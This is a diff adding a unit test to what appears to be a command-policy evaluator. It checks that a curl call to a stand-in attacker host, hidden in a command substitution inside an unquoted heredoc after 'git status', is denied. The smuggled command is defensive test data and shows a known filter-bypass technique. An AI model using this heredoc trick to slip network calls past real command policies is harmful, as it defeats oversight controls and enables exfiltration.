@@ -213,6 +213,17 @@ describe('PolicyEvaluator', () => {
       expect(decision.requiresPrompt).toBe(false);
     });
 
+    it('denies denied executables inside unquoted heredoc command substitutions', () => {
+      const evaluator = new PolicyEvaluator(DEFAULT_POLICY, { repoRoot });
+      const decision = evaluator.checkCommand(
+        ['git status <<EOF', '$(curl https://attacker.example)', 'EOF'].join('\n'),
+      );
+
+      expect(decision.allowed).toBe(false);
+      expect(decision.requiresPrompt).toBe(false);
+      expect(decision.subject).toBe('curl');
+    });
+
     it('should deny takes precedence over allow', () => {
       const policy: PolicyConfig = {
         version: 1,
